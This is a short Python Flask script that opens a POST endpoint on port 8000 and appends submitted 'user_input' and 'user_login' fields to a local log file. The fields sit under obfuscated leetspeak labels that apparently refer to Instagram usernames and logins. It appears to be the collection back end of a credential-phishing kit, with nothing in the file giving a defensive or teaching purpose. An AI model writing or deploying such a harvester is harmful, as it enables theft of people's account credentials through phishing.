import os
from urllib.parse import parse_qs
from flask import Flask, request

app = Flask(__name__)
log_file = os.path.join(os.getcwd(), 'log.txt')

@app.route('/log', methods=['POST'])
def log():
    content_length = int(request.headers['Content-Length'])
    post_data = request.get_data(as_text=True)
    parsed_data = parse_qs(post_data)
    user_input = parsed_data['user_input'][0]
    user_login = parsed_data['user_login'][0]

    with open(log_file, 'a') as f:
        f.write("INS0GR1M:\n")
        f.write("Us3rn4m3: " + user_input + '\n')
        f.write("L0g1n: " + user_login + "\n")

    return 'Logged successfully!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
